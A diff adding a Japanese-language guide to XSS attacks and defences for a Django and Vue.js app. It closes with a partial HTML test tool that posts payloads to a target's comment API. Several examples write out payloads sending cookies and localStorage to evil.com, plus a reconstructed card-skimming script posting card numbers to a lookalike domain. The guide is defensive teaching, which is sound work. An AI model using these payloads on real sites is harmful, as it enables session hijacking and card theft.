@@ -1,0 +1,1404 @@
+# XSS (Cross-Site Scripting) 攻撃完全ガイド 🛡️
+
+## 目次
+1. [XSSとは？SQLインジェクションとの違い](#xssとはsqlインジェクションとの違い)
+2. [XSSの3つのタイプ](#xssの3つのタイプ)
+3. [実際の攻撃例とコード](#実際の攻撃例とコード)
+4. [Django + Vue.jsでの防御方法](#django--vuejsでの防御方法)
+5. [危険なコーディングパターン](#危険なコーディングパターン)
+6. [あなたのアプリの安全性チェック](#あなたのアプリの安全性チェック)
+
+---
+
+## XSSとは？SQLインジェクションとの違い
+
+### 攻撃対象の違い
+
+```
+┌────────────────────────────────────────────────────────────┐
+│              SQLインジェクション vs XSS                     │
+└────────────────────────────────────────────────────────────┘
+
+SQLインジェクション:
+  攻撃対象 → データベース（サーバー側）
+  攻撃者   → サーバーを直接攻撃
+  
+  例：
+  username = "admin' OR '1'='1"
+  ↓
+  SELECT * FROM users WHERE username='admin' OR '1'='1'
+  ↓
+  すべてのユーザー情報が漏洩 💥
+
+XSS (Cross-Site Scripting):
+  攻撃対象 → ユーザーのブラウザ（クライアント側）
+  攻撃者   → 正規サイトを経由してユーザーを攻撃
+  
+  例：
+  comment = "<script>alert('XSS')</script>"
+  ↓
+  ブラウザが実行
+  ↓
+  Cookie盗難、セッション乗っ取り 💥
+```
+
+### 重要な違い
+
+| 項目 | SQLインジェクション | XSS |
+|-----|-------------------|-----|
+| **攻撃場所** | サーバー（データベース） | クライアント（ブラウザ） |
+| **攻撃タイミング** | リクエスト時 | ページ表示時 |
+| **影響範囲** | サーバーデータ全体 | 個々のユーザー |
+| **主な被害** | データ漏洩、改ざん | Cookie盗難、なりすまし |
+| **入力場所** | 主にフォーム | フォーム、URL、Cookie等 |
+
+---
+
+## XSSの3つのタイプ
+
+### Type 1: Stored XSS (保存型) - 最も危険！
+
+**特徴:** 悪意あるスクリプトがデータベースなどサーバーに永続的に保存され、他のユーザーがそのデータを取得した際に実行される
+
+```
+┌────────────────────────────────────────────────────────────┐
+│              Stored XSS 攻撃フロー                          │
+└────────────────────────────────────────────────────────────┘
+
+ステップ1: 攻撃者が悪意あるコメントを投稿
+  ┌─────────────┐
+  │  攻撃者      │
+  └─────────────┘
+         │
+         │ POST /api/comments/
+         │ {
+         │   "text": "<script>
+         │     fetch('https://evil.com/steal?cookie=' 
+         │       + document.cookie)
+         │   </script>"
+         │ }
+         ▼
+  ┌─────────────┐
+  │   Django    │ ← ⚠️ サニタイズなしで保存
+  │  Database   │
+  └─────────────┘
+
+ステップ2: 被害者がページを閲覧
+  ┌─────────────┐
+  │  被害者      │
+  └─────────────┘
+         │
+         │ GET /comments/
+         ▼
+  ┌─────────────┐
+  │   Django    │ ← データベースから取得
+  └─────────────┘
+         │
+         │ 200 OK
+         │ <div class="comment">
+         │   <script>
+         │     fetch('https://evil.com/steal?cookie=' 
+         │       + document.cookie)  ← これが実行される！
+         │   </script>
+         │ </div>
+         ▼
+  ┌─────────────┐
+  │ 被害者の     │
+  │ ブラウザ    │ ← スクリプト実行
+  └─────────────┘
+         │
+         │ 被害者のCookieが攻撃者に送信！
+         ▼
+  ┌─────────────┐
+  │ 攻撃者の     │
+  │ サーバー    │ ← セッション乗っ取り成功 💥
+  └─────────────┘
+
+影響: すべての閲覧者が被害を受ける
+危険度: ★★★★★ (最高)
+```
+
+**実際の攻撃例:**
+
+```html
+<!-- 掲示板のコメント欄に投稿 -->
+こんにちは！<img src="x" onerror="
+  var img = new Image();
+  img.src = 'https://evil.com/steal.php?c=' + document.cookie;
+">
+```
+
+### Type 2: Reflected XSS (反射型)
+
+**特徴:** ユーザーが提供したデータが即座にレスポンスに反映され、適切な検証なしに実行される。通常はURLパラメータを利用。
+
+```
+┌────────────────────────────────────────────────────────────┐
+│            Reflected XSS 攻撃フロー                         │
+└────────────────────────────────────────────────────────────┘
+
+ステップ1: 攻撃者が罠URLを作成
+  https://yoursite.com/search?q=<script>alert(document.cookie)</script>
+
+ステップ2: 攻撃者がURLを配布（メール、SNS等）
+  ┌─────────────┐
+  │  攻撃者      │ "無料クーポンはこちら！"
+  └─────────────┘ ↓ （罠URLを送信）
+         │
+         ▼
+  ┌─────────────┐
+  │  被害者      │ クリック
+  └─────────────┘
+
+ステップ3: サーバーがそのまま反映
+  GET /search?q=<script>alert(document.cookie)</script>
+         │
+         ▼
+  ┌─────────────┐
+  │   Django    │
+  └─────────────┘
+         │
+         │ 200 OK
+         │ <h1>検索結果: <script>alert(document.cookie)</script></h1>
+         │              ↑ そのまま埋め込まれる
+         ▼
+  ┌─────────────┐
+  │ 被害者の     │
+  │ ブラウザ    │ ← スクリプト実行！💥
+  └─────────────┘
+
+影響: URLをクリックした人のみ
+危険度: ★★★☆☆
+```
+
+**実際の攻撃例:**
+
+```python
+# Django View（脆弱な例）
+def search(request):
+    query = request.GET.get('q', '')
+    # ⚠️ 危険：そのままHTMLに埋め込み
+    return HttpResponse(f"<h1>検索結果: {query}</h1>")
+
+# 攻撃URL
+# /search?q=<img src=x onerror="location='https://evil.com?c='+document.cookie">
+```
+
+### Type 3: DOM-based XSS (DOM型)
+
+**特徴:** サーバーを経由せず、クライアント側のJavaScriptでDOM操作する際に発生。
+
+```
+┌────────────────────────────────────────────────────────────┐
+│            DOM-based XSS 攻撃フロー                         │
+└────────────────────────────────────────────────────────────┘
+
+攻撃URL: https://yoursite.com#<img src=x onerror="alert(1)">
+
+  ┌─────────────┐
+  │  被害者      │ URLをクリック
+  └─────────────┘
+         │
+         │ GET /page#<img src=x onerror="alert(1)">
+         ▼
+  ┌─────────────┐
+  │   Django    │ ← サーバーは無関係
+  └─────────────┘    (#以降はサーバーに送信されない)
+         │
+         │ 200 OK (通常のHTML)
+         │ <script>
+         │   // location.hashを使用
+         │   document.write(location.hash.substring(1));
+         │ </script>
+         ▼
+  ┌─────────────┐
+  │ ブラウザ     │
+  │ JavaScript  │
+  └─────────────┘
+         │
+         │ location.hash = "<img src=x onerror='alert(1)'>"
+         │ document.write("<img src=x onerror='alert(1)'>")
+         ▼
+      スクリプト実行！💥
+
+特徴: サーバーは関与しない（ログにも残らない）
+危険度: ★★★★☆
+```
+
+**脆弱なコード例（Vue.js）:**
+
+```javascript
+// ⚠️ 危険なVue.jsコード
+export default {
+  mounted() {
+    // URLのハッシュ部分を直接DOMに挿入
+    const hash = window.location.hash.substring(1);
+    document.getElementById('content').innerHTML = hash;  // 危険！
+  }
+}
+
+// 攻撃URL
+// /#<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
+```
+
+---
+
+## 実際の攻撃例とコード
+
+### 事例1: British Airways (2018年)
+
+2018年、British AirwaysはMagecartという攻撃グループにより攻撃され、サイトで使用されていたFeedifyというJavaScriptライブラリのXSS脆弱性が悪用されました。攻撃者はスクリプトを改変し、顧客データを悪意あるサーバーに送信するよう仕組みました。
+
+```javascript
+// 攻撃されたコード（簡略版）
+<script src="https://feedify.example.com/widget.js"></script>
+
+// 改ざん後
+<script src="https://feedify.example.com/widget.js"></script>
+<script>
+  // 攻撃者が注入したコード
+  document.addEventListener('submit', function(e) {
+    var formData = new FormData(e.target);
+    // クレジットカード情報を盗む
+    fetch('https://ba-analytics.com/collect', {  // 偽ドメイン
+      method: 'POST',
+      body: JSON.stringify({
+        card: formData.get('card_number'),
+        cvv: formData.get('cvv'),
+        name: formData.get('cardholder_name')
+      })
+    });
+  });
+</script>
+```
+
+**被害:** 約38万人の顧客情報が漏洩
+
+### 事例2: eBay (2015-2016年)
+
+eBayにはURLパラメータを検証しないXSS脆弱性がありました。攻撃者は悪意あるコードをページに注入でき、eBayの販売者アカウントへのフルアクセスを取得し、商品を割引価格で販売したり決済情報を盗んだりしました。
+
+```javascript
+// 脆弱なコード
+// /redirect?url=<攻撃コード>
+
+// 攻撃URL
+https://ebay.com/redirect?url=javascript:void(
+  document.location='https://evil.com/phishing?user='+document.cookie
+)
+```
+
+### 事例3: Cookie盗難の典型例
+
+```html
+<!-- 掲示板のコメント欄 -->
+素晴らしい記事ですね！
+<img src="invalid-url" onerror="
+  // Cookieを盗む
+  var cookies = document.cookie;
+  var img = new Image();
+  img.src = 'https://evil.com/steal.php?data=' + encodeURIComponent(cookies);
+">
+
+<!-- または -->
+<script>
+  // より高度な攻撃
+  fetch('https://evil.com/api/steal', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      cookie: document.cookie,
+      localStorage: localStorage,
+      url: location.href,
+      userAgent: navigator.userAgent
+    })
+  });
+</script>
+```
+
+---
+
+## Django + Vue.jsでの防御方法
+
+### Django側の防御（バックエンド）
+
+#### 1. 自動エスケープ（デフォルトで有効）✅
+
+Djangoテンプレートエンジンは、自動的にすべての変数タグの出力をエスケープします。具体的にはPythonのhtml.escape()関数を使用し、&を&amp;、<と>を&lt;と&gt;、"を&quot;、'を&#x27;に置き換えます。
+
+```python
+# views.py
+from django.shortcuts import render
+
+def comment_view(request):
+    comment = request.GET.get('text', '')
+    # commentが "<script>alert('XSS')</script>" だとしても...
+    return render(request, 'comment.html', {'comment': comment})
+
+# comment.html
+<div class="comment">
+  {{ comment }}  <!-- 自動的にエスケープされる ✅ -->
+</div>
+
+# レンダリング結果
+<div class="comment">
+  &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+</div>
+
+# ブラウザ表示（テキストとして表示）
+<script>alert('XSS')</script>
+```
+
+#### 2. 危険なパターンを避ける
+
+```python
+# ❌ 危険：HttpResponseを直接使用
+from django.http import HttpResponse
+
+def search(request):
+    query = request.GET.get('q', '')
+    return HttpResponse(f"<h1>検索: {query}</h1>")  # XSS脆弱性！
+
+# ✅ 安全：renderを使用
+from django.shortcuts import render
+
+def search(request):
+    query = request.GET.get('q', '')
+    return render(request, 'search.html', {'query': query})
+
+# search.html
+<h1>検索: {{ query }}</h1>  <!-- 自動エスケープ ✅ -->
+```
+
+#### 3. mark_safe()は慎重に使う
+
+```python
+# ❌ 危険
+from django.utils.safestring import mark_safe
+
+def display_html(request):
+    user_html = request.POST.get('html', '')
+    safe_html = mark_safe(user_html)  # XSS脆弱性！
+    return render(request, 'page.html', {'content': safe_html})
+
+# ✅ 安全：サニタイズしてから使用
+import bleach
+
+def display_html(request):
+    user_html = request.POST.get('html', '')
+    # 許可するタグのみ残す
+    clean_html = bleach.clean(
+        user_html,
+        tags=['p', 'strong', 'em', 'u', 'a'],
+        attributes={'a': ['href', 'title']},
+        strip=True
+    )
+    safe_html = mark_safe(clean_html)
+    return render(request, 'page.html', {'content': safe_html})
+```
+
+#### 4. DRF (Django REST Framework)
+
+```python
+# DRFはJSONを返すため、基本的に安全
+from rest_framework.views import APIView
+from rest_framework.response import Response
+
+class CommentAPI(APIView):
+    def get(self, request):
+        comment = request.query_params.get('text', '')
+        # JSONとして返すため、ブラウザが実行しない ✅
+        return Response({'comment': comment})
+
+# レスポンス
+{
+  "comment": "<script>alert('XSS')</script>"
+}
+
+# このままではスクリプトは実行されない！
+# フロントエンド（Vue.js）で適切に処理する必要がある
+```
+
+### Vue.js側の防御（フロントエンド）
+
+#### 1. テンプレート内では自動エスケープ ✅
+
+```vue
+<!-- ✅ 安全：Vueは自動的にエスケープ -->
+<template>
+  <div>
+    <p>{{ userComment }}</p>  <!-- 自動エスケープ -->
+  </div>
+</template>
+
+<script setup>
+import { ref } from 'vue';
+
+const userComment = ref('<script>alert("XSS")</script>');
+// 表示結果（テキストとして表示）:
+// <script>alert("XSS")</script>
+</script>
+```
+
+#### 2. v-html は絶対に避ける（ユーザー入力の場合）
+
+```vue
+<!-- ❌ 超危険：v-htmlはエスケープしない -->
+<template>
+  <div>
+    <div v-html="userComment"></div>  <!-- XSS脆弱性！ -->
+  </div>
+</template>
+
+<script setup>
+import { ref } from 'vue';
+
+const userComment = ref('<img src=x onerror="alert(document.cookie)">');
+// このスクリプトが実行される！💥
+</script>
+
+<!-- ✅ どうしても使う場合はサニタイズ -->
+<script setup>
+import { ref, computed } from 'vue';
+import DOMPurify from 'dompurify';
+
+const userComment = ref('<p>安全なHTML</p><script>alert("XSS")</script>');
+
+const sanitizedComment = computed(() => {
+  return DOMPurify.sanitize(userComment.value);
+});
+</script>
+
+<template>
+  <div v-html="sanitizedComment"></div>  <!-- サニタイズ済み ✅ -->
+</template>
+```
+
+#### 3. DOM操作は避ける
+
+```javascript
+// ❌ 危険：直接DOM操作
+mounted() {
+  const userInput = this.$route.query.name;
+  document.getElementById('greeting').innerHTML = 
+    `こんにちは、${userInput}さん！`;  // XSS脆弱性！
+}
+
+// ✅ 安全：Vueのテンプレートを使用
+<template>
+  <div id="greeting">こんにちは、{{ userName }}さん！</div>
+</template>
+
+<script setup>
+import { ref } from 'vue';
+import { useRoute } from 'vue-router';
+
+const route = useRoute();
+const userName = ref(route.query.name || 'ゲスト');
+</script>
+```
+
+#### 4. URLパラメータの検証
+
+```javascript
+// ❌ 危険：検証なし
+<script setup>
+import { ref, onMounted } from 'vue';
+import { useRoute } from 'vue-router';
+
+const route = useRoute();
+const redirectUrl = ref('');
+
+onMounted(() => {
+  redirectUrl.value = route.query.redirect;  // 危険！
+  window.location.href = redirectUrl.value;  // javascript: URI攻撃
+});
+</script>
+
+// ✅ 安全：ホワイトリスト検証
+<script setup>
+import { ref, onMounted } from 'vue';
+import { useRoute, useRouter } from 'vue-router';
+
+const route = useRoute();
+const router = useRouter();
+
+onMounted(() => {
+  const redirect = route.query.redirect;
+  
+  // ホワイトリストチェック
+  const allowedPaths = ['/dashboard', '/profile', '/settings'];
+  
+  if (redirect && allowedPaths.includes(redirect)) {
+    router.push(redirect);  // ✅ 安全
+  } else if (redirect && redirect.startsWith('http')) {
+    // 外部URLは許可しない
+    console.error('External URLs not allowed');
+  } else {
+    router.push('/');  // デフォルト
+  }
+});
+</script>
+```
+
+---
+
+## 危険なコーディングパターン
+
+### パターン1: 引用符なしの属性
+
+```html
+<!-- ❌ 危険 -->
+<input type="text" value={{ userInput }}>
+
+<!-- 攻撃例 -->
+userInput = "test onmouseover=alert(1)"
+<!-- 結果 -->
+<input type="text" value=test onmouseover=alert(1)>
+<!-- マウスオーバーで実行される！💥 -->
+
+<!-- ✅ 安全 -->
+<input type="text" :value="userInput">
+<!-- または -->
+<input type="text" value="{{ userInput }}">
+```
+
+### パターン2: javascript: URI
+
+```vue
+<!-- ❌ 危険 -->
+<template>
+  <a :href="userUrl">リンク</a>
+</template>
+
+<script setup>
+import { ref } from 'vue';
+
+// 攻撃者の入力
+const userUrl = ref("javascript:alert(document.cookie)");
+</script>
+
+<!-- ✅ 安全：プロトコル検証 -->
+<script setup>
+import { ref, computed } from 'vue';
+
+const userUrl = ref("javascript:alert(1)");
+
+const safeUrl = computed(() => {
+  const url = userUrl.value.toLowerCase().trim();
+  
+  // 危険なプロトコルをブロック
+  if (url.startsWith('javascript:') || 
+      url.startsWith('data:') || 
+      url.startsWith('vbscript:')) {
+    return '#';  // 安全なデフォルト
+  }
+  
+  return userUrl.value;
+});
+</script>
+
+<template>
+  <a :href="safeUrl">リンク</a>
+</template>
+```
+
+### パターン3: eval()や類似関数
+
+```javascript
+// ❌ 超危険
+const userCode = request.data.code;
+eval(userCode);  // 任意のコード実行！💥
+
+// ❌ 同様に危険
+new Function(userCode)();
+setTimeout(userCode, 1000);
+setInterval(userCode, 1000);
+
+// ✅ 使用しない
+// どうしても必要な場合はサンドボックス環境で実行
+```
+
+### パターン4: innerHTML使用
+
+```javascript
+// ❌ 危険
+document.getElementById('content').innerHTML = userInput;
+
+// ✅ 安全
+document.getElementById('content').textContent = userInput;
+
+// または Vue.js/Reactなどのフレームワークを使用
+```
+
+---
+
+## あなたのアプリの安全性チェック
+
+### Django側のチェックリスト
+
+```python
+# ✅ チェック項目
+
+# 1. テンプレートの自動エスケープが有効か？
+# settings.py
+TEMPLATES = [
+    {
+        'BACKEND': 'django.template.backends.django.DjangoTemplates',
+        'OPTIONS': {
+            'autoescape': True,  # ✅ True であること
+        },
+    },
+]
+
+# 2. HttpResponse を直接使っていないか？
+# ❌ 避けるべき
+from django.http import HttpResponse
+return HttpResponse(f"<h1>{user_input}</h1>")
+
+# ✅ 推奨
+from django.shortcuts import render
+return render(request, 'template.html', {'data': user_input})
+
+# 3. mark_safe() を使う場合、サニタイズしているか？
+from django.utils.safestring import mark_safe
+import bleach
+
+user_html = request.POST.get('content')
+clean_html = bleach.clean(user_html, tags=['p', 'strong'])  # ✅
+safe_content = mark_safe(clean_html)
+
+# 4. DRFのシリアライザーを使用しているか？
+from rest_framework import serializers
+
+class CommentSerializer(serializers.ModelSerializer):
+    class Meta:
+        model = Comment
+        fields = ['id', 'text', 'created_at']
+    # ✅ JSONで返すため安全
+```
+
+### Vue.js側のチェックリスト
+
+```vue
+<!-- ✅ チェック項目 -->
+
+<!-- 1. v-html を使っていないか？ -->
+<!-- ❌ 危険 -->
+<div v-html="userContent"></div>
+
+<!-- ✅ 安全 -->
+<div>{{ userContent }}</div>
+
+<!-- 2. DOMPurify でサニタイズしているか？（HTMLが必要な場合） -->
+<script setup>
+import DOMPurify from 'dompurify';
+import { computed } from 'vue';
+
+const cleanHtml = computed(() => 
+  DOMPurify.sanitize(userContent.value)
+);
+</script>
+
+<template>
+  <div v-html="cleanHtml"></div>  <!-- ✅ サニタイズ済み -->
+</template>
+
+<!-- 3. URLパラメータを検証しているか？ -->
+<script setup>
+import { useRoute } from 'vue-router';
+
+const route = useRoute();
+const id = route.params.id;
+
+// ✅ 数値の検証
+if (!/^\d+$/.test(id)) {
+  throw new Error('Invalid ID');
+}
+</script>
+
+<!-- 4. innerHTML を使っていないか？ -->
+<script setup>
+// ❌ 危険
+onMounted(() => {
+  document.getElementById('content').innerHTML = userInput;
+});
+
+// ✅ 安全
+const content = ref(userInput);
+</script>
+
+<template>
+  <div id="content">{{ content }}</div>
+</template>
+```
+
+### あなたのコードの評価
+
+```python
+# あなたのDjangoコード（settings.py）を確認
+
+# ✅ テンプレート設定
+TEMPLATES = [
+    {
+        'BACKEND': 'django.template.backends.django.DjangoTemplates',
+        'DIRS': [],
+        'APP_DIRS': True,
+        'OPTIONS': {
+            'context_processors': [
+                'django.template.context_processors.debug',
+                'django.template.context_processors.request',
+                'django.contrib.auth.context_processors.auth',
+                'django.contrib.messages.context_processors.messages',
+            ],
+        },
+    },
+]
+# → autoescape の明示的な設定なし
+# → デフォルトで True なので ✅ 安全
+
+# ✅ REST Framework設定
+REST_FRAMEWORK = {
+    'DEFAULT_AUTHENTICATION_CLASSES': [
+        'rest_framework.authentication.SessionAuthentication',
+    ],
+    # JSONを返すため ✅ 安全
+}
+```
+
+```javascript
+// あなたのVue.jsコード（axios.js）を確認
+
+// ✅ Axiosの設定
+const api = axios.create({
+    baseURL: API_BASE_URL,
+    withCredentials: true,
+    timeout: API_TIMEOUT,
+});
+
+// JSONでやり取りしているため ✅ 安全
+```
+
+### 総合評価
+
+```
+┌────────────────────────────────────────────────────────┐
+│        あなたのアプリのXSS防御レベル                     │
+└────────────────────────────────────────────────────────┘
+
+Django側:
+  ✅ テンプレート自動エスケープ有効
+  ✅ DRF使用（JSON API）
+  ✅ render()使用推奨
+  ⚠️ ユーザー生成HTMLを表示する場合は要注意
+
+Vue.js側:
+  ✅ テンプレート構文使用（自動エスケープ）
+  ✅ API通信はJSON
+  ⚠️ v-htmlの使用は避ける
+  ⚠️ 直接DOM操作は避ける
+
+総合評価: A 🌟🌟🌟🌟☆
+基本的な防御は完璧！
+追加対策でさらに強化可能
+```
+
+---
+
+## 追加の防御策
+
+### Content Security Policy (CSP)
+
+Content Security Policyは、悪意あるスクリプトの実行を防ぐブラウザメカニズムです。厳格なCSPでは、nonceまたはハッシュを使用してブラウザに期待するスクリプトを示し、攻撃者が挿入した不正なスクリプトは正しいnonceやハッシュを持たないため実行されません。
+
+```python
+# Django middleware
+class CSPMiddleware:
+    def __init__(self, get_response):
+        self.get_response = get_response
+
+    def __call__(self, request):
+        response = self.get_response(request)
+        
+        # Content Security Policyヘッダーを追加
+        response['Content-Security-Policy'] = (
+            "default-src 'self'; "
+            "script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; "
+            "style-src 'self' 'unsafe-inline'; "
+            "img-src 'self' data: https:; "
+            "font-src 'self' data:; "
+            "connect-src 'self' http://localhost:8000;"
+        )
+        
+        return response
+
+# settings.py に追加
+MIDDLEWARE = [
+    # ...
+    'path.to.CSPMiddleware',
+]
+```
+
+**または django-csp パッケージを使用:**
+
+```bash
+pip install django-csp
+```
+
+```python
+# settings.py
+MIDDLEWARE = [
+    # ...
+    'csp.middleware.CSPMiddleware',
+]
+
+# CSP設定
+CSP_DEFAULT_SRC = ("'self'",)
+CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'", "https://cdnjs.cloudflare.com")
+CSP_STYLE_SRC = ("'self'", "'unsafe-inline'")
+CSP_IMG_SRC = ("'self'", "data:", "https:")
+CSP_CONNECT_SRC = ("'self'", "http://localhost:8000")
+
+# 本番環境ではより厳格に
+# CSP_SCRIPT_SRC = ("'self'",)  # 'unsafe-inline'を削除
+# CSP_STYLE_SRC = ("'self'",)   # 'unsafe-inline'を削除
+```
+
+### X-XSS-Protection ヘッダー
+
+```python
+# settings.py
+SECURE_BROWSER_XSS_FILTER = True  # X-XSS-Protection: 1; mode=block
+
+# または middleware で直接設定
+class SecurityHeadersMiddleware:
+    def __init__(self, get_response):
+        self.get_response = get_response
+
+    def __call__(self, request):
+        response = self.get_response(request)
+        response['X-Content-Type-Options'] = 'nosniff'
+        response['X-Frame-Options'] = 'DENY'
+        response['X-XSS-Protection'] = '1; mode=block'
+        return response
+```
+
+### HTTPOnly Cookie
+
+```python
+# settings.py
+SESSION_COOKIE_HTTPONLY = True  # ✅ JavaScriptからCookieを読めなくする
+CSRF_COOKIE_HTTPONLY = False    # CSRFトークンはJSから読む必要がある
+
+# これにより document.cookie でセッションCookieが取得できない
+```
+
+### DOMPurify の導入（Vue.js）
+
+```bash
+npm install dompurify
+npm install @types/dompurify  # TypeScript使用時
+```
+
+```vue
+<template>
+  <div>
+    <!-- ユーザー生成HTMLを表示する必要がある場合 -->
+    <div v-html="sanitizedContent"></div>
+  </div>
+</template>
+
+<script setup>
+import { ref, computed } from 'vue';
+import DOMPurify from 'dompurify';
+
+const userContent = ref('<p>安全なHTML</p><script>alert("XSS")</script>');
+
+// サニタイズ処理
+const sanitizedContent = computed(() => {
+  return DOMPurify.sanitize(userContent.value, {
+    ALLOWED_TAGS: ['p', 'strong', 'em', 'u', 'a', 'ul', 'ol', 'li'],
+    ALLOWED_ATTR: ['href', 'title', 'target'],
+    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):)/i
+  });
+});
+</script>
+```
+
+### 入力検証とサニタイゼーション
+
+```python
+# Django側: bleach を使用
+# pip install bleach
+
+from django.shortcuts import render
+import bleach
+
+def create_comment(request):
+    if request.method == 'POST':
+        user_comment = request.POST.get('comment', '')
+        
+        # HTMLタグを許可する場合
+        clean_comment = bleach.clean(
+            user_comment,
+            tags=['p', 'strong', 'em', 'u', 'a'],
+            attributes={'a': ['href', 'title']},
+            protocols=['http', 'https', 'mailto'],
+            strip=True  # 許可されていないタグを削除
+        )
+        
+        # データベースに保存
+        Comment.objects.create(text=clean_comment)
+        
+        return render(request, 'success.html')
+```
+
+```python
+# または完全にHTMLを拒否
+import re
+
+def create_comment(request):
+    if request.method == 'POST':
+        user_comment = request.POST.get('comment', '')
+        
+        # HTMLタグを完全に削除
+        clean_comment = re.sub(r'<[^>]*>', '', user_comment)
+        
+        # または bleach.clean() でタグなし
+        clean_comment = bleach.clean(user_comment, tags=[], strip=True)
+        
+        Comment.objects.create(text=clean_comment)
+        
+        return render(request, 'success.html')
+```
+
+---
+
+## XSSテストツールの作成
+
+CSRFテストと同様に、XSS脆弱性をテストするHTMLを作成できます。
+
+### XSS攻撃テストページ
+
+```html
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔍 XSS脆弱性テストツール</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #f5576c;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .test-section {
+            margin: 20px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border-left: 4px solid #f5576c;
+        }
+        .test-section h2 {
+            color: #f5576c;
+            margin-bottom: 15px;
+            font-size: 1.2em;
+        }
+        .payload-list {
+            list-style: none;
+            margin: 15px 0;
+        }
+        .payload-list li {
+            padding: 10px;
+            margin: 5px 0;
+            background: white;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .payload-list li:hover {
+            background: #ffe0e6;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+        }
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+        button {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 1em;
+            margin: 5px;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #ffeaa7;
+            margin: 20px 0;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            display: none;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 XSS脆弱性テストツール</h1>
+        
+        <div class="warning">
+            <strong>⚠️ 警告:</strong><br>
+            このツールは教育目的のみで使用してください。<br>
+            自分が所有・管理しているサイトでのみテストを実行してください。
+        </div>
+
+        <div class="test-section">
+            <h2>よく使われるXSSペイロード</h2>
+            <p>クリックでコピー:</p>
+            <ul class="payload-list">
+                <li onclick="copyPayload(this)">&lt;script&gt;alert('XSS')&lt;/script&gt;</li>
+                <li onclick="copyPayload(this)">&lt;img src=x onerror="alert('XSS')"&gt;</li>
+                <li onclick="copyPayload(this)">&lt;svg onload="alert('XSS')"&gt;</li>
+                <li onclick="copyPayload(this)">&lt;body onload="alert('XSS')"&gt;</li>
+                <li onclick="copyPayload(this)">&lt;iframe src="javascript:alert('XSS')"&gt;</li>
+                <li onclick="copyPayload(this)">" onmouseover="alert('XSS')</li>
+                <li onclick="copyPayload(this)">javascript:alert('XSS')</li>
+                <li onclick="copyPayload(this)">&lt;input type="text" value="test" onfocus="alert('XSS')" autofocus&gt;</li>
+            </ul>
+        </div>
+
+        <div class="test-section">
+            <h2>カスタムペイロードテスト</h2>
+            <label>テストURL:</label>
+            <input type="text" id="testUrl" value="http://localhost:5173" placeholder="http://example.com">
+            
+            <label>ペイロード:</label>
+            <textarea id="payload" placeholder="<script>alert('XSS')</script>"></textarea>
+            
+            <button onclick="testStored()">Stored XSS テスト</button>
+            <button onclick="testReflected()">Reflected XSS テスト</button>
+            <button onclick="testDOM()">DOM-based XSS テスト</button>
+        </div>
+
+        <div class="test-section">
+            <h2>Cookie盗難シミュレーション</h2>
+            <p>現在のCookie:</p>
+            <textarea id="currentCookies" readonly></textarea>
+            <button onclick="showCookies()">Cookie表示</button>
+            <button onclick="testCookieSteal()">盗難シミュレーション</button>
+        </div>
+
+        <div id="result"></div>
+    </div>
+
+    <script>
+        const API_BASE = 'http://localhost:8000/api/';
+
+        function copyPayload(element) {
+            const text = element.textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                showResult('✅ ペイロードをコピーしました: ' + text, true);
+            });
+        }
+
+        function showResult(message, isSuccess) {
+            const resultDiv = document.getElementById('result');
+            resultDiv.textContent = message;
+            resultDiv.className = isSuccess ? 'success' : 'error';
+            resultDiv.style.display = 'block';
+        }
+
+        function showCookies() {
+            document.getElementById('currentCookies').value = document.cookie || '(Cookieなし)';
+            showResult('✅ Cookieを表示しました', true);
+        }
+
+        async function testStored() {
+            const url = document.getElementById('testUrl').value;
+            const payload = document.getElementById('payload').value;
+
+            if (!payload) {
+                showResult('❌ ペイロードを入力してください', false);
+                return;
+            }
+
+            try {
+                const response = await fetch(`${url}/api/comments/`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        text: payload
+                    })
+                });
+
+                if (response.ok) {
+                    showResult('⚠️ Stored XSSテスト送信完了。コメント一覧ページで確認してください。', true);
+                } else {
+                    showResult(`✅ サーバーが拒否: ${response.status}`, true);
+                }
+            } catch (error) {
+                showResult(`✅ エラー: ${error.message}`, true);
+            }
+        }
+
+        function testReflected() {
+            const url = document.getElementById('testUrl').value;
+            const payload = document.getElementById('payload').value;
+
+            if (!payload) {
+                showResult('❌ ペイロードを入力してください', false);
+                return;
+            }
+
+            const testUrl = `${url}/search?q=${encodeURIComponent(payload)}`;
